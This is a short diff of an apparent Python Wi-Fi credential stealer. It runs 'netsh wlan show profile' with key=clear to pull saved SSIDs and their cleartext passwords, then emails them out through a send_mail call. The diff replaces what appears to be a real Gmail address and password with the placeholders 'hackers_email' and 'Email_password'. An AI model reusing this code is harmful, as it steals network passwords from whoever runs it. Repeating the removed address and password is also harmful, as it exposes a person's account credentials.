@@ -13,4 +13,4 @@ for i in profiles:
     results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
     result = [b.split(":")[1][1:-1] for b in results if "SSID name" in b]
     result2 = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
-    send_mail("akshay010696@gmail.com", "Fl@m!ng0aksh1", str(result+result2))
+    send_mail("hackers_email", "Email_password", str(result+result2))
